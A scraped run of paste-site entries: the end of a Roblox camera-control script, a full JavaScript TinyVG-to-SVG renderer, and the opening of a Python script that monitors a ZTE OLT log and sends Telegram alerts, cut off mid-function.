    local newCFrame = currentCFrame:Lerp(targetCFrame, CONFIG.SMOOTHING_SPEED)
    camera.CFrame = CFrame.new(currentCFrame.Position) * CFrame.fromOrientation(newCFrame:ToOrientation())
end

local function onInputBegan(input, gameProcessed)
    if gameProcessed then return end

    if input.KeyCode == CONFIG.GUI_TOGGLE_KEY then
        if settingsGui then
            settingsGui:Destroy()
            settingsGui = nil
        else
            settingsGui = createSettingsGui()
        end
        return
    end

    if not scriptEnabled then return end

    if input.KeyCode == CONFIG.TRIGGER_KEY then
        isKeyHeld = true
        selectedPoint = findClosestPoint()
        initialLookVector = camera.CFrame.LookVector

        if not player.PlayerGui:FindFirstChild(""CameraPointIndicators"") then
            createIndicators()
        end

        RunService:BindToRenderStep(
            ""ProximityCameraControl"",
            Enum.RenderPriority.Camera.Value,
            updateCamera
        )
    elseif input.KeyCode == Enum.KeyCode.A then
        isAHeld = true
    elseif input.KeyCode == Enum.KeyCode.D then
        isDHeld = true
    end
end

local function onInputEnded(input, gameProcessed)
    if input.KeyCode == CONFIG.TRIGGER_KEY then
        isKeyHeld = false
        selectedPoint = nil

        local indicatorsGui = player.PlayerGui:FindFirstChild(""CameraPointIndicators"")
        if indicatorsGui then
            indicatorsGui:Destroy()
        end

        RunService:UnbindFromRenderStep(""ProximityCameraControl"")
    elseif input.KeyCode == Enum.KeyCode.A then
        isAHeld = false
    elseif input.KeyCode == Enum.KeyCode.D then
        isDHeld = false
    end
end

UserInputService.InputBegan:Connect(onInputBegan)
UserInputService.InputEnded:Connect(onInputEnded)

game:BindToClose(function()
    local indicatorsGui = player.PlayerGui:FindFirstChild(""CameraPointIndicators"")
    if indicatorsGui then
        indicatorsGui:Destroy()
    end
    if settingsGui then
        settingsGui:Destroy()
    end
end)"
MjrnsytH,Browser support for TinyVG,honey_the_codewitch,JavaScript,Sunday 8th of June 2025 03:47:47 AM CDT,"// TinyVG Renderer 
// Copyright (C) by honey the codewitch
// MIT License
// To use, pass am ArrayBuffer with the
// TVG document to tvgDimensions
// or tvgRender. With render,
// you place an empty SVG element, 
// ex: <svg id=""..."" xmlms=""..."" />
// and pass the id of it to the render
// method. At that point, the SVG tag
// will be populated and rendered by
// the browser.

const tvgInit = (data, id) => {
    return {
        data: data,
        view: new DataView(data),
        cursor: 0,
        scale: 0,
        color_encoding: 0,
        coord_range: 0,
        width: 0, height: 0,
        colors_size: 0,
        colors: [],
        doc: document.getElementById(id), //SVGSVGElement
        elem: undefined, // SVGElement
        gradIndex: 0
    };
}
const tvgDistance = (pointLhs, pointRhs) => {
    const xd = pointRhs.x - pointLhs.x;
    const yd = pointRhs.y - pointLhs.y;
    return Math.sqrt((xd * xd) + (yd * yd));
}
const tvgAdvCoord = (rangeOrCtx) => {
    let range = rangeOrCtx;
    if (rangeOrCtx.coord_range) {
        range = rangeOrCtx.range;
    }
    switch (range) {
        case 0://""default""
            return 2;
        case 1://""reduced"":
            return 1;
        case 2://""extended""
            return 4;
    }
}
const tvgMapZeroToMax = (rangeOrCtx, value) => {
    let range = rangeOrCtx;
    if (rangeOrCtx.coord_range) {
        range = rangeOrCtx.range;
    }
    if (0 == value) {
        switch (range) {
            case 0: //""default""
                return 0xFFFF;
            case 1: //""reduced""
                return 0xFF;
            case 2: //""extended""
                return 0xFFFFFFFF;
        }
        return undefined;
    }
    return value;
}
const tvgReadCoordBI = (range, startIndex, data) => {
    const view = new DataView(data);
    switch (range) {
        case 0: //""default""
            return view.getUint16(startIndex, true);

        case 1: //""reduced""
            return view.getUint8(startIndex);

        case 2: //""extended""
            return view.getUint32(startIndex, true);
    }
    return undefined;
}
const tvgReadCoord = (ctx) => {
    let result = undefined;
    switch (ctx.coord_range) {
        case 0: //""default""
            result = ctx.view.getUint16(ctx.cursor, true);
            ctx.cursor += 2;
            break;
        case 1: //""reduced""
            result = ctx.view.getUint8(ctx.cursor);
            ctx.cursor += 1;
            break;
        case 2: //""extended""
            result = ctx.view.getUint32(ctx.cursor, true);
            ctx.cursor += 4;
            break;
    }
    return result;
}
const tvgReadU32 = (ctx) => {
    let count = 0;
    let result = 0;
    var byte;
    while (true) {
        byte = ctx.view.getUint8(ctx.cursor++);
        const val = (byte & 0x7F) << (7 * count);
        result |= val;
        if ((byte & 0x80) === 0)
            break;
        ++count;
    }
    return result;
}
const tvgDownscaleCoord = (ctx, coord) => {
    const factor = (1) << ctx.scale;
    return coord / factor;
}
const tvgReadUnit = (ctx) => {
    const val = tvgReadCoord(ctx);
    return tvgDownscaleCoord(ctx, val);
}
const tvgReadPoint = (ctx) => {
    const x = tvgReadUnit(ctx);
    const y = tvgReadUnit(ctx);
    return { x: x, y: y };
}
const tvgReadColor = (ctx) => {
    switch (ctx.color_encoding) {
        case 2: { // TVG_COLOR_F32:
            // read four values
            const data = [];
            data.push(ctx.view.getFloat32(ctx.cursor, true)); ctx.cursor += 4;
            data.push(ctx.view.getFloat32(ctx.cursor, true)); ctx.cursor += 4;
            data.push(ctx.view.getFloat32(ctx.cursor, true)); ctx.cursor += 4;
            data.push(ctx.view.getFloat32(ctx.cursor, true)); ctx.cursor += 4;
            return { r: data[0], g: data[1], b: data[2], a: data[3] };
        }
        case 1: { // TVG_COLOR_U565: 
            const data = ctx.view.getUint16(ctx.cursor, true);
            ctx.cursor += 2;
            return {
                r: (data & 0x1F) / 15.0,
                g: ((data >>> 5) & 0x3F) / 31.0,
                b: ((data >>> 11) & 0x1F) / 15.0,
                a: 1.0
            };
        }
        case 0: { // TVG_COLOR_U8888: 
            // read four values
            const data = [];
            data.push(ctx.view.getUint8(ctx.cursor++));
            data.push(ctx.view.getUint8(ctx.cursor++));
            data.push(ctx.view.getUint8(ctx.cursor++));
            data.push(ctx.view.getUint8(ctx.cursor++));
            return { r: data[0] / 255.0, g: data[1] / 255.0, b: data[2] / 255.0, a: data[3] / 255.0 };
        }
        case 3: // TVG_COLOR_CUSTOM
            throw ""TinyVG: Custom color table not supported"";
        default:
            throw ""TinyVG: Invalid color format"";
    }
}
const tvgParseGradient = (ctx) => {
    const point0 = tvgReadPoint(ctx);
    const point1 = tvgReadPoint(ctx);
    const color0 = tvgReadU32(ctx);
    const color1 = tvgReadU32(ctx);
    return { point0: point0, point1: point1, color0: color0, color1: color1 };
}
const tvgParseStyle = (ctx, kind) => {
    switch (kind) {
        case 0: // TVG_STYLE_FLAT:
            return { kind: kind, flat: tvgReadU32(ctx) };
        case 1: // TVG_STYLE_LINEAR:
            return { kind: kind, linear: tvgParseGradient(ctx) };
        case 2: //TVG_STYLE_RADIAL:
            return { kind: kind, radial: tvgParseGradient(ctx) };
        default:
            throw ""TinyVG: Invalid format parsing style"";
    }
}
const tvgParseFillHeader = (ctx, kind) => {
    const u32 = tvgReadU32(ctx);
    const size = u32 + 1;
    //out_header->size = count;
    const style = tvgParseStyle(ctx, kind);
    return { size: size, style: style };
}
const tvgParseLineHeader = (ctx, kind) => {
    const u32 = tvgReadU32(ctx);
    const size = u32 + 1;

    const style = tvgParseStyle(ctx, kind);
    const line_width = tvgReadUnit(ctx);

    return { size: size, style: style, line_width: line_width };
}

const tvgParseLineFillHeader = (ctx, kind) => {

    var d = ctx.view.getUint8(ctx.cursor++);
    const size = (d & 0x3F) + 1;
    const fill_style = tvgParseStyle(ctx, kind);
    const line_style = tvgParseStyle(ctx, (d >>> 6) & 0x03);
    const line_width = tvgReadUnit(ctx);
    return { size: size, fill_style: fill_style, line_style: line_style, line_width: line_width };
}
const tvgParsePathD = (ctx, size) => {
    var st, cur;
    var pt;
    var u32;
    var f32;
    var d;
    let result = """";
    pt = tvgReadPoint(ctx);
    result += `M${pt.x} ${pt.y}`;
    st = pt;
    cur = pt;
    for (let j = 0; j < size; ++j) {
        d = ctx.view.getUint8(ctx.cursor++);
        if (((d >>> 4) & 1) !== 0) { // has line
            tvgReadUnit(ctx); // throw away line width (future use)
        }
        switch (d & 7) {
            case 0: // TVG_PATH_LINE:
                pt = tvgReadPoint(ctx);
                result += ` L${pt.x} ${pt.y}`
                cur = pt;
                break;
            case 1: // TVG_PATH_HLINE:
                pt.x = tvgReadUnit(ctx);;
                pt.y = cur.y;
                result += ` H${pt.x}`;
                cur = pt;
                break;
            case 2: // TVG_PATH_VLINE:
                pt.x = cur.x;
                pt.y = tvgReadUnit(ctx);
                result += ` V${pt.y}`;
                cur = pt;
                break;
            case 3: { // TVG_PATH_CUBIC: 
                const ctrl1 = tvgReadPoint(ctx);
                const ctrl2 = tvgReadPoint(ctx);
                const endp = tvgReadPoint(ctx);
                result += ` C${ctrl1.x} ${ctrl1.y} ${ctrl2.x} ${ctrl2.y} ${endp.x} ${endp.y}`;
                cur = endp;
            } break;
            case 4: { // TVG_PATH_ARC_CIRCLE: {
                d = ctx.view.getUint8(ctx.cursor++);
                const radius = tvgReadUnit(ctx);
                pt = tvgReadPoint(ctx);
                result += ` A${radius} ${radius} 0 ${d & 1} ${1 - ((d >>> 1) & 1)} ${pt.x} ${pt.y}`;
                cur = pt;
            } break;
            case 5: { // TVG_PATH_ARC_ELLIPSE: 
                d = ctx.view.getUint8(ctx.cursor++);
                const radius_x = tvgReadUnit(ctx);
                const radius_y = tvgReadUnit(ctx);
                const rotation = tvgReadUnit(ctx);
                pt = tvgReadPoint(ctx);
                result += ` A${radius_x} ${radius_y} ${rotation} ${d & 1} ${1 - ((d >>> 1) & 1)} ${pt.x} ${pt.y}`;
                cur = pt;
            } break;
            case 6: // TVG_PATH_CLOSE:
                result += ' Z';
                cur = st;
                break;
            case 7: { // TVG_PATH_QUAD:
                const ctrl = tvgReadPoint(ctx);
                const endp = tvgReadPoint(ctx);
                result += ` Q${ctrl.x} ${ctrl.y} ${endp.x} ${endp.y}`
                cur = endp;
            } break;
            default:
                throw ""TinyVG: Unrecognized command parsing path"";
        }
    }
    return result;
}
const tvgParseRect = (ctx) => {
    const pt = tvgReadPoint(ctx);
    const w = tvgReadUnit(ctx);
    const h = tvgReadUnit(ctx);
    return { x: pt.x, y: pt.y, width: w, height: h };
}
const tvgToHex = (code) => {
    let result = code.toString(16);
    if (result.length === 1) {
        return ""0"" + result;
    }
    return result;
}
const tvgColorToSvgColorAndOpacity = (col) => {
    return { color: `#${tvgToHex(col.r * 255)}${tvgToHex(col.g * 255)}${tvgToHex(col.b * 255)}`, opacity: col.a };
}
const tvgCreateSvgNode = (n, v) => {
    n = document.createElementNS(""http://www.w3.org/2000/svg"", n);
    if (v) {
        for (let p in v) {
            n.setAttributeNS(null, p.replace(/[A-Z]/g, function (m, p, o, s) { return ""-"" + m.toLowerCase(); }), v[p]);
        }
    }
    return n;
}
const tvgAddSvgAttribute = (n, a, v) => {
    n.setAttributeNS(null, a, v);
}
const tvgCreateSvgGradient = (ctx, style) => {
    let da = ctx.doc.getElementsByTagNameNS(""http://www.w3.org/2000/svg"", ""defs"");
    var defs;
    if (da.length == 0) {
        defs = tvgCreateSvgNode(""defs"");
        ctx.doc.prepend(defs);
    } else {
        defs = da[0];
    }
    if (style.kind === 1) {
        const node = tvgCreateSvgNode(""linearGradient"",
            {
                id: `TvgGradient${ctx.gradIndex + 1}`,
                x1: style.linear.point0.x,
                y1: style.linear.point0.y,
                x2: style.linear.point1.x,
                y2: style.linear.point1.y
            });
        node.setAttributeNS(null, ""gradientUnits"", ""userSpaceOnUse"");
        node.setAttributeNS(null, ""spreadMethod"", ""pad"");
        let col = tvgColorToSvgColorAndOpacity(ctx.colors[style.linear.color0]);
        const stop1 = tvgCreateSvgNode(""stop"", { offset: ""0%"", stopColor: col.color });//, stopOpacity: col.opacity});
        node.appendChild(stop1);
        col = tvgColorToSvgColorAndOpacity(ctx.colors[style.linear.color1]);
        const stop2 = tvgCreateSvgNode(""stop"", { offset: ""100%"", stopColor: col.color });//, stopOpacity: col.opacity});
        node.appendChild(stop2);
        defs.appendChild(node);
        ++ctx.gradIndex;
        return node.getAttributeNS(null, ""id"");
    } else if (style.kind === 2) {
        const r = tvgDistance(style.radial.point0, style.radial.point1);
        const node = tvgCreateSvgNode(""radialGradient"",
            {
                id: `TvgGradient${ctx.gradIndex + 1}`,
                cx: style.radial.point0.x,
                cy: style.radial.point0.y,
                fx: style.radial.point0.x,
                fy: style.radial.point0.y,
                r: r
            });
        node.setAttributeNS(null, ""gradientUnits"", ""userSpaceOnUse"");
        node.setAttributeNS(null, ""spreadMethod"", ""pad"");
        let col = tvgColorToSvgColorAndOpacity(ctx.colors[style.radial.color0]);
        const stop1 = tvgCreateSvgNode(""stop"", { offset: ""0%"", stopColor: col.color, stopOpacity: col.opacity });
        node.appendChild(stop1);
        col = tvgColorToSvgColorAndOpacity(ctx.colors[style.radial.color1]);
        const stop2 = tvgCreateSvgNode(""stop"", { offset: ""100%"", stopColor: col.color, stopOpacity: col.opacity });
        node.appendChild(stop2);
        defs.appendChild(node);
        ++ctx.gradIndex;
        return node.getAttributeNS(null, ""id"");
    } else if (style.kind === 0) throw ""TinyVG: attempt to pass flat style to create gradient"";
    else throw ""TinyVG: attempt to pass an invalid style to create gradient"";
}
const tvgApplyStyle = (ctx, style, isFill) => {
    if (style.kind === 0) { // flat
        const col = tvgColorToSvgColorAndOpacity(ctx.colors[style.flat]);
        if (isFill) {
            tvgAddSvgAttribute(ctx.elem, ""fill"", col.color);
            tvgAddSvgAttribute(ctx.elem, ""fill-opacity"", col.opacity);
        } else {
            tvgAddSvgAttribute(ctx.elem, ""stroke"", col.color);
            tvgAddSvgAttribute(ctx.elem, ""stroke-opacity"", col.opacity);
        }
    } else if (style.kind === 1 || style.kind === 2) { // linear
        const grad = tvgCreateSvgGradient(ctx, style);
        if (isFill) {
            tvgAddSvgAttribute(ctx.elem, ""fill"", `url(#${grad})`);
        } else {
            tvgAddSvgAttribute(ctx.elem, ""stroke"", `url(#${grad})`);
        }
    } else throw ""TinyVG: attempt to apply invalid style"";
}
const tvgParseFillRectangles = (ctx, size, fill_style) => {
    let count = size;
    if (count === 0) throw ""TinyVG: Invalid zero length filled rectangles entry"";
    let rect = tvgParseRect(ctx);
    let r = tvgCreateSvgNode(""rect"", rect);
    ctx.doc.appendChild(r);
    ctx.elem = r;
    tvgAddSvgAttribute(ctx.elem, ""fill-rule"", ""evenodd"");
    tvgApplyStyle(ctx, fill_style, true);
    const attrs = {};
    attrs.fillRule = ""evenodd"";
    if (fill_style.kind !== 0) {
        attrs.fill = r.getAttributeNS(null, ""fill"")
    } else {
        attrs.fill = r.getAttributeNS(null, ""fill"")
        attrs.fillOpacity = r.getAttributeNS(null, ""fill-opacity"");
    }
    --count;
    while (count--) {
        rect = tvgParseRect(ctx);
        const localAttrs = { ...attrs, ...rect };
        r = tvgCreateSvgNode(""rect"", localAttrs);
        ctx.doc.appendChild(r);
        ctx.elem = r;
    }
}
const tvgParseLineFillRectangles = (ctx, size, fill_style, line_style, line_width) => {
    let count = size;
    if (count === 0) throw ""TinyVG: Invalid zero length line filled rectangles entry"";
    if (line_width === 0) {  // 0 width is invalid
        line_width = .001;
    }
    let rect = tvgParseRect(ctx);
    let r = tvgCreateSvgNode(""rect"", rect);
    ctx.doc.appendChild(r);
    ctx.elem = r;
    tvgAddSvgAttribute(ctx.elem, ""fill-rule"", ""evenodd"");
    tvgAddSvgAttribute(ctx.elem, ""stroke-width"", line_width);
    tvgApplyStyle(ctx, fill_style, true);
    tvgApplyStyle(ctx, line_style, false);
    const attrs = {};
    attrs.fillRule = ""evenodd"";
    if (fill_style.kind !== 0) {
        attrs.fill = r.getAttributeNS(null, ""fill"");
    } else {
        attrs.fill = r.getAttributeNS(null, ""fill"");
        attrs.fillOpacity = r.getAttributeNS(null, ""fill-opacity"");
    }
    if (line_style.kind !== 0) {
        attrs.stroke = r.getAttributeNS(null, ""stroke"");
    } else {
        attrs.stroke = r.getAttributeNS(null, ""stroke"");
        attrs.strokeOpacity = r.getAttributeNS(null, ""stroke-opacity"");
    }
    attrs.strokeWidth = line_width;
    --count;
    while (count--) {
        rect = tvgParseRect(ctx);
        const localAttrs = { ...attrs, ...rect };
        r = tvgCreateSvgNode(""rect"", localAttrs);
        ctx.doc.appendChild(r);
        ctx.elem = r;
    }
}
const tvgParseFillPaths = (ctx, size, style) => {
    if (size === 0) throw ""TinyVG: Invalid zero filled paths entry"";
    const attrs = {};
    attrs.fillRule = ""evenodd"";
    attrs.strokeOpacity = 0;
    attrs.strokeWidth = 0;
    const sizes = [];
    for (let i = 0; i < size; ++i) {
        sizes.push(tvgReadU32(ctx) + 1);
    }
    let p = tvgCreateSvgNode(""path"", attrs);
    ctx.doc.appendChild(p);
    ctx.elem = p;
    tvgApplyStyle(ctx, style, true);
    if (style.kind !== 0) {
        attrs.fill = p.getAttributeNS(null, ""fill"");
    } else {
        attrs.fill = p.getAttributeNS(null, ""fill"");
        attrs.fillOpacity = p.getAttributeNS(null, ""fill-opacity"");
    }
    let d = tvgParsePathD(ctx, sizes[0]);
    for (let i = 1; i < size; ++i) {
        d+= ` ${tvgParsePathD(ctx, sizes[i])}`;
    }
    tvgAddSvgAttribute(p, ""d"", d);
}
const tvgParseLinePaths = (ctx, size, line_style, line_width) => {
    if (size === 0) throw ""TinyVG: Invalid zero line paths entry"";
    if (line_width === 0) {  // 0 width is invalid
        line_width = .001;
    }
    const attrs = {};
    const sizes = [];
    for (let i = 0; i < size; ++i) {
        sizes.push(tvgReadU32(ctx) + 1);
    }
    let p = tvgCreateSvgNode(""path"", attrs);
    ctx.doc.appendChild(p);
    ctx.elem = p;
    tvgAddSvgAttribute(ctx.elem, ""fill-opacity"", 0);
    tvgAddSvgAttribute(ctx.elem, ""stroke-width"", line_width);
    tvgApplyStyle(ctx, line_style, false);
    if (line_style.kind !== 0) {
        attrs.stroke = p.getAttributeNS(null, ""stroke"");
    } else {
        attrs.stroke = p.getAttributeNS(null, ""stroke"");
        attrs.strokeOpacity = p.getAttributeNS(null, ""stroke-opacity"");
    }
    attrs.strokeWidth = line_width;
    attrs.fillOpacity = 0;
    let d = tvgParsePathD(ctx, sizes[0]);
    for (let i = 1; i < size; ++i) {
        d+= ` ${tvgParsePathD(ctx, sizes[i])}`;
    }
    tvgAddSvgAttribute(p, ""d"", d);
}
const tvgParseLineFillPaths = (ctx, size, fill_style, line_style, line_width) => {
    if (size === 0) throw ""TinyVG: Invalid zero line filled paths entry"";
    if (line_width === 0) {  // 0 width is invalid
        line_width = .001;
    }
    const attrs = {};
    attrs.fillRule = ""evenodd"";
    const sizes = [];
    for (let i = 0; i < size; ++i) {
        sizes.push(tvgReadU32(ctx) + 1);
    }
    let p = tvgCreateSvgNode(""path"", attrs);
    ctx.doc.appendChild(p);
    ctx.elem = p;
    tvgApplyStyle(ctx, fill_style, true);
    if (fill_style.kind !== 0) {
        attrs.fill = p.getAttributeNS(null, ""fill"");
    } else {
        attrs.fill = p.getAttributeNS(null, ""fill"");
        attrs.fillOpacity = p.getAttributeNS(null, ""fill-opacity"");
    }
    tvgApplyStyle(ctx, line_style, false);
    if (line_style.kind !== 0) {
        attrs.stroke = p.getAttributeNS(null, ""stroke"");
    } else {
        attrs.stroke = p.getAttributeNS(null, ""stroke"");
        attrs.strokeOpacity = p.getAttributeNS(null, ""stroke-opacity"");
    }
    attrs.strokeWidth = line_width;
    tvgAddSvgAttribute(p, ""stroke-width"", line_width);
    let d = tvgParsePathD(ctx, sizes[0]);
    for (let i = 1; i < size; ++i) {
        d+= ` ${tvgParsePathD(ctx, sizes[i])}`;
    }
    tvgAddSvgAttribute(p, ""d"", d);
}
const tvgParseFillPolygon = (ctx, size, fill_style) => {
    if (size === 0) throw ""TinyVG: Invalid zero polygon entry"";
    let count = size;
    let points = """";
    let pt = tvgReadPoint(ctx);
    points += `${pt.x},${pt.y}`;
    while (--count) {
        pt = tvgReadPoint(ctx);
        points += ` ${pt.x},${pt.y}`;
    }
    const attrs = { fillRule: ""evenodd"", points: points };
    let p = tvgCreateSvgNode(""polygon"", attrs);
    ctx.doc.appendChild(p);
    ctx.elem = p;
    tvgApplyStyle(ctx, fill_style, true);
}
const tvgParsePolyline = (ctx, size, line_style, line_width, close) => {
    if (size === 0) throw ""TinyVG: Invalid zero polyline entry"";
    if (line_width === 0) {  // 0 width is invalid
        line_width = .001;
    }
    let count = size;
    let points = """";
    let pt = tvgReadPoint(ctx);
    points += `${pt.x},${pt.y}`;
    while (--count) {
        pt = tvgReadPoint(ctx);
        points += ` ${pt.x},${pt.y}`;
    }
    const attrs = { points: points, lineWidth: line_width, fillOpacity: 0 };
    let p = tvgCreateSvgNode(close ? ""polygon"" : ""polyline"", attrs);
    ctx.doc.appendChild(p);
    ctx.elem = p;
    tvgApplyStyle(ctx, line_style, false);
}
const tvgParseLineFillPolyline = (ctx, size, fill_style, line_style, line_width, close) => {
    if (size === 0) throw ""TinyVG: Invalid zero line fill polyline entry"";
    if (line_width === 0) {  // 0 width is invalid
        line_width = .001;
    }
    let count = size;
    let points = """";
    let pt = tvgReadPoint(ctx);
    points += `${pt.x},${pt.y}`;
    while (--count) {
        pt = tvgReadPoint(ctx);
        points += ` ${pt.x},${pt.y}`;
    }
    const attrs = { points: points, lineWidth: line_width, fillRule: ""evenodd"" };
    let p = tvgCreateSvgNode(close ? ""polygon"" : ""polyline"", attrs);
    ctx.doc.appendChild(p);
    ctx.elem = p;
    tvgApplyStyle(ctx, fill_style, true);
    tvgApplyStyle(ctx, line_style, false);
}
const tvgParseLines = (ctx, size, line_style, line_width) => {
    if (size === 0) throw ""TinyVG: Invalid zero lines entry"";
    for (let i = 0; i < size; ++i) {
        const pt1 = tvgReadPoint(ctx);
        const pt2 = tvgReadPoint(ctx);
        const attrs = { x1: pt1.x, y1: pt1.y, x2: pt2.x, y2: pt2.y, strokeWidth: line_width };
        let l = tvgCreateSvgNode(""line"", attrs);
        ctx.doc.appendChild(l);
        ctx.elem = l;
        tvgApplyStyle(ctx, line_style, false);
    }
}
const tvgParseCommands = (ctx) => {
    let cmd = 255;
    while (cmd != 0) {
        cmd = ctx.view.getUint8(ctx.cursor++);
        switch (cmd & 0x3F) {
            case 0: // TVG_CMD_END_DOCUMENT:
                // console.log(""TVG END"");
                break;
            case 1: { // TVG_CMD_FILL_POLYGON: 
                // console.log(""TVG FILL POLYGON"");
                const data = tvgParseFillHeader(ctx, (cmd >>> 6) & 3);
                tvgParseFillPolygon(ctx, data.size, data.style);
            } break;
            case 2: { // TVG_CMD_FILL_RECTANGLES: 
                // console.log(""TVG FILL RECTANGLES"");
                const data = tvgParseFillHeader(ctx, (cmd >>> 6) & 3);
                tvgParseFillRectangles(ctx, data.size, data.style);
            } break;
            case 3: { // TVG_CMD_FILL_PATH: 
                // console.log(""TVG FILL PATH"");
                const data = tvgParseFillHeader(ctx, (cmd >>> 6) & 3);
                tvgParseFillPaths(ctx, data.size, data.style);
            } break;
            case 4: { // TVG_CMD_DRAW_LINES: 
                // console.log(""TVG LINES"");
                const data = tvgParseLineHeader(ctx, (cmd >>> 6) & 3);
                tvgParseLines(ctx, data.size, data.style, data.line_width);
            } break;
            case 5: { // TVG_CMD_DRAW_LINE_LOOP: 
                // console.log(""TVG LINE LOOP"");
                const data = tvgParseLineHeader(ctx, (cmd >>> 6) & 3);
                tvgParsePolyline(ctx, data.size, data.style, data.line_width, true);
            } break;
            case 6: { // TVG_CMD_DRAW_LINE_STRIP:
                // console.log(""TVG LINE STRIP"");
                const data = tvgParseLineHeader(ctx, (cmd >>> 6) & 3);
                tvgParsePolyline(ctx, data.size, data.style, data.line_width, false);
            } break;
            case 7: { // TVG_CMD_DRAW_LINE_PATH: 
                // console.log(""TVG LINE PATH"");
                const data = tvgParseLineHeader(ctx, (cmd >>> 6) & 3);
                tvgParseLinePaths(ctx, data.size, data.style, data.line_width);
            } break;
            case 8: { // TVG_CMD_OUTLINE_FILL_POLYGON: 
                // console.log(""TVG OUTLINE FILL POLYGON"");
                const data = tvgParseLineFillHeader(ctx, (cmd >>> 6) & 3);
                tvgParseLineFillPolyline(ctx, data.size, data.fill_style, data.line_style, data.line_width, true);
            } break;
            case 9: { // TVG_CMD_OUTLINE_FILL_RECTANGLES:
                // console.log(""TVG OUTLINE FILL RECTANGLES"");
                const data = tvgParseLineFillHeader(ctx, (cmd >>> 6) & 3);
                tvgParseLineFillRectangles(ctx, data.size, data.fill_style, data.line_style, data.line_width);
            } break;
            case 10: { // TVG_CMD_OUTLINE_FILL_PATH: 
                // console.log(""TVG OUTLINE FILL PATH"");
                const data = tvgParseLineFillHeader(ctx, (cmd >>> 6) & 3);
                tvgParseLineFillPaths(ctx, data.size, data.fill_style, data.line_style, data.line_width);
            } break;
            default:
                throw `TinyVG: Invalid command in document (0x${tvgToHex(cmd)})`;
        }
    }
}
// get the {width, height} of a TVG in an arraybuffer
export const tvgDimensions = (data) => {
    if (data) {
        const view = new DataView(data);
        if (view.byteLength > 5) {
            // check for TVG v 1.0 header
            if (view.getUint8(0) == 0x72 && view.getUint8(1) == 0x56 && view.getUint8(2) == 1) {
                const flags = view.getUint8(3);
                const range = (flags >>> 6) & 0x03;
                const w = tvgReadCoordBI(range, 4, data);
                const h = tvgReadCoordBI(range, 4 + tvgAdvCoord(range), data);
                const dim = {
                    width: tvgMapZeroToMax(range, w),
                    height: tvgMapZeroToMax(range, h)
                };
                return dim;
            }
        }
    }
    return undefined;
}
// Render a TVG in an arraybuffer (data) to an SVG tag indicated by the id
export const tvgRender = (id, data) => {
    if (!id) throw ""TinyVG: Must specify the id of an SVG element"";
    if (!data) throw ""TinyVG: Must provide an ArrayBuffer with TVG data"";
    const view = new DataView(data);
    if (view.byteLength > 5) {
        if (view.getUint8(0) == 0x72 && view.getUint8(1) == 0x56 && view.getUint8(2) == 1) {
            const ctx = tvgInit(data, id);
            if (ctx.doc) {
                const flags = view.getUint8(3);
                ctx.scale = (flags & 0xF);
                ctx.color_encoding = ((flags >>> 4) & 0x3);
                ctx.coord_range = (flags >>> 6) & 0x03;
                ctx.cursor = 4;
                const w = tvgReadCoord(ctx);
                const h = tvgReadCoord(ctx);
                ctx.width = tvgMapZeroToMax(ctx, w);
                ctx.height = tvgMapZeroToMax(ctx, h);
                const colcount = tvgReadU32(ctx);
                if (!colcount || colcount === 0) throw ""TinyVG: invalid format - color table contains nothing"";
                for (let i = 0; i < colcount; ++i) {
                    ctx.colors.push(tvgReadColor(ctx));
                }
                while (ctx.doc.firstChild) {
                    ctx.doc.removeChild(ctx.doc.lastChild);
                }
                tvgAddSvgAttribute(ctx.doc, ""width"", w.toString(10));
                tvgAddSvgAttribute(ctx.doc, ""height"", h.toString(10));
                tvgAddSvgAttribute(ctx.doc, ""viewBox"", `0 0 ${w} ${h}`);
                tvgParseCommands(ctx);
                return;
            }
        }
    }
    throw ""TinyVG: Not a valid TinyVG file"";
}"
tRGHxFcG,OLT-zte send_telegram,skybetik,Python,Sunday 8th of June 2025 03:00:28 AM CDT,"import re
import os
import requests
import time
from datetime import datetime, date
from collections import defaultdict
import configparser
import logging
import schedule
import threading
import sys

# Налаштування логів
LOG_FILE_PATH = '/opt/olt_monitor/olt_monitor.log'
LAN_EVENTS_LOG = '/opt/olt_monitor/lan_events.log'  
SENT_MESSAGES_FILE = '/opt/olt_monitor/sent_messages.txt'
LAST_RESET_FILE = '/opt/olt_monitor/last_log_reset.txt'
LAST_ACTIVATION_FILE = '/opt/olt_monitor/last_activation.txt'

# Створення lan_events.log при старті, якщо не існує
if not os.path.exists(LAN_EVENTS_LOG):
    try:
        with open(LAN_EVENTS_LOG, 'w', encoding='utf-8') as f:
            f.write('')
        logging.info(f""Створено файл {LAN_EVENTS_LOG}"")
    except Exception as e:
        logging.error(f""Помилка створення {LAN_EVENTS_LOG}: {e}"")
        raise

# Налаштування логгера для lan_events.log
lan_logger = logging.getLogger('lan_events')
lan_handler = logging.FileHandler(LAN_EVENTS_LOG, encoding='utf-8')
lan_handler.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
lan_logger.addHandler(lan_handler)
lan_logger.setLevel(logging.INFO)

# Змінна для відстеження часу попереджень
last_size_warning = {}

# Налаштування логування в консоль і olt_monitor.log
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler(LOG_FILE_PATH, encoding='utf-8')]
)

# Завантаження конфігурації
config = configparser.ConfigParser()
try:
    config.read('/opt/olt_monitor/config.ini')
except Exception as e:
    logging.error(f""Помилка читання config.ini: {e}"")
    raise

# Конфігурація
try:
    TELEGRAM_BOT_TOKEN = config.get('Settings', 'TelegramBotToken')
    TELEGRAM_CHAT_IDS = config.get('Settings', 'TelegramChatIDs').split(',')
    REPORT_TIME = config.get('Settings', 'ReportTime', fallback='06:00')
    LOG_FILE = config.get('Settings', 'LogFile', fallback='/var/log/zte.log')
    LAST_POSITION_FILE = config.get('Settings', 'LastPositionFile', fallback='/opt/olt_monitor/last_position.txt')
    CHECK_INTERVAL = config.getint('Settings', 'CheckInterval', fallback=5)
except Exception as e:
    logging.error(f""Помилка парсингу конфігурації: {e}"")
    raise

# Завантажуємо відправлені повідомлення
def load_sent_messages():
    if not os.path.exists(SENT_MESSAGES_FILE):
        return set()
    try:
        with open(SENT_MESSAGES_FILE, 'r', encoding='utf-8') as f:
            return set(line.strip() for line in f if line.strip())
    except Exception as e:
        logging.error(f""Помилка читання файлу {SENT_MESSAGES_FILE}: {e}"")
        return set()

# Зберігаємо нове повідомлення
def save_sent_message(msg, sent_messages):
    try:
        with open(SENT_MESSAGES_FILE, 'a', encoding='utf-8') as f:
            f.write(msg + '\n')
        sent_messages.add(msg)
    except Exception as e:
        logging.error(f""Помилка збереження повідомлення в {SENT_MESSAGES_FILE}: {e}"")

# Перевірка часу останнього повідомлення про активацію
def can_send_activation():
